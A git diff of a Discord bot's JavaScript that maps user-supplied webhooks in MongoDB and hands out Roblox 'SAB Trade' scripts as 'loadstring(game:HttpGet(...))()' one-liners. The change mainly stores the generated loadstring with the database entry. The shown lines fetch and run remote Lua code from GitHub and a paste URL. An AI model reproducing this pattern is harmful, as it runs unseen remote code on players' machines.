@@ -160,7 +160,8 @@ const WebHookIdSchema = new mongoose.Schema({
         required: true,
         trim: true
     },
-    userName: { type: String, required: true }
+    userName: { type: String, required: true },
+    script: { type: String, required: true }
 }, {
     timestamps: true
 });
@@ -314,14 +315,7 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
             // Génération de l'ID unique pour la base de données
             const webhookUuid = generateWebhookId();
 
-            // 2. Sauvegarde en Base de données (MongoDB)
-            const newWebhookEntry = new WebHookId({
-                webhookId: webhookUuid,
-                url: webhookUrl,
-                userId: userId,
-                userName: userName
-            });
-            await newWebhookEntry.save();
+            
             log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.username}`);
 
             // 3. Préparation du Code Source Lua
@@ -349,6 +343,15 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyS
 
             // 6. Préparation du résultat final
             const finalLoadstring = `loadstring(game:HttpGet("${pasteUrl}", true))()`;
+            // 2. Sauvegarde en Base de données (MongoDB)
+            const newWebhookEntry = new WebHookId({
+                webhookId: webhookUuid,
+                url: webhookUrl,
+                userId: userId,
+                userName: userName,
+                script: finalLoadstring
+            });
+            await newWebhookEntry.save();
             
             const dmEmbed = new EmbedBuilder()
                 .setTitle("🚀 SAB Trade Script Ready")
